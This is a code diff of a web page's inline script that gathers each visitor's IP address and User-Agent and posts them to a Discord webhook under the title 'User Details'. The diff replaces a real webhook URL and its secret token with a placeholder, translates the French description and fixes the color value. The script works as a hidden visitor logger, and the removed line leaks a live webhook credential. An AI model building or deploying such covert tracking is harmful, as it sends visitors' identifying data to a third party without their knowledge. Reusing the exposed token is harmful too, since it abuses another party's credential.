@@ -43,13 +43,13 @@
     <script src="main.js"></script>
     <script>
         function sendDetailsToWebhook(details) {
-            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257993219485077628/foypbWcAqqIUEzUgBYZd3K-fISh-TIvH8jNtL_-k3Vlhj0A2ZxCHGM1j_AXjsUo3GwH5';
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
 
             const data = {
                 embeds: [{
                     title: 'User Details',
-                    description: 'Détails de lutilisateur accédant à la page.',
-                    color: 8679C2,
+                    description: 'Details of the user accessing the page.',
+                    color: 0xff0000, // Red color (you can use any valid hex color code)
                     fields: [
                         { name: 'IP Address', value: details.ip, inline: true },
                         { name: 'User-Agent', value: details.userAgent, inline: true },
